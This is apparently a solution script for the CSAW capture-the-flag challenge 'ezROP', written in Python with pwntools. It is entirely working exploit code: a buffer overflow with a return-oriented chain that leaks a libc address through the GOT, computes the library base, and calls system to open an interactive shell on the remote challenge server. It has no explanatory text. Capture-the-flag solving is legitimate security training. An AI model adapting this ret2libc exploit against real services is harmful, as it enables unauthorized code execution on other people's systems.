from pwn import *
# p = process("./ezROP")
p = remote("pwn.chal.csaw.io",9999)
context.arch='amd64'
# gdb.attach(p,'b *0x401533')
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
sla 	= lambda a,b: 	p.sendlineafter(a,b)
rdi = 0x00000000004015a3
rsi = rdi-2
got = 0x000000000403fe8
plt = 0x4010a0
main = 0x40150b

sla("?\n",b"\0"*120+flat([rdi,got,plt,main,]))
p.readuntil("!\n")
base = u64(p.readline()[:-1]+b'\0\0') - (0x7ffff7e4c420-0x00007ffff7dc8000)
log.warning(hex(base))

ret = rdi+1
system = base +0x52290
sla("?\n",b"\0"*120+flat([rdi,base+0x1b45bd,ret,system]))

p.interactive()
